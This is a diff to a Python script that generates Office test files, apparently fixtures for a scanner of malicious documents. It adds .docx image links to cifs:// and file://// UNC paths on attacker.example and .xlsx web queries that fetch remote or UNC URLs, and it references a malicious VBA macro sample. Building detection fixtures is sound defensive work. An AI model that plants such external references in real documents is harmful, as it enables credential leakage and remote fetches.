@@ -711,6 +711,15 @@ def main() -> None:
               '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
     write(R / "office_field_include.docx", docx(fields))
     write(R / "office_smb.docx", docx(doc_rels=[("rId9", "image", "smb://attacker.example/share/logo.png", True)]))
+    write(R / "office_cifs.docx", docx(doc_rels=[("rId9", "image", "cifs://attacker.example/share/logo.png", True)]))
+    write(R / "office_file4.docx", docx(doc_rels=[("rId9", "image", "file:////attacker.example/share/logo.png", True)]))
+    # An Excel web query (xl/connections.xml) fetches a page when the workbook refreshes.
+    conn = lambda url: {"xl/connections.xml": (CT_HEAD + '<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
+                        f'<connection id="1" name="Query" type="4" refreshedVersion="6"><webPr url="{url}"/></connection></connections>').encode()}
+    write(R / "office_webquery.xlsx", xlsx(extra=conn("http://remote.example/table.html")))
+    write(R / "office_webquery_unc.xlsx", xlsx(extra=conn("\\\\attacker.example\\share\\table.html")))
+    write(R / "office_webquery_safe.xlsx", xlsx(extra={"xl/connections.xml": (CT_HEAD + '<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
+                                                       '<connection id="1" name="Local" type="1"><dbPr connection="Provider=SQLOLEDB" command="select 1"/></connection></connections>').encode()}))
     # Legacy PowerPoint keeps its VBA project in a zlib-compressed ExOleObjStg record, not in a CFB stream.
     raw = cfb(vba_project({"Module1": VBA_EVIL_DOC.replace("ThisDocument", "Module1")}))
     zc = zlib.compress(raw)
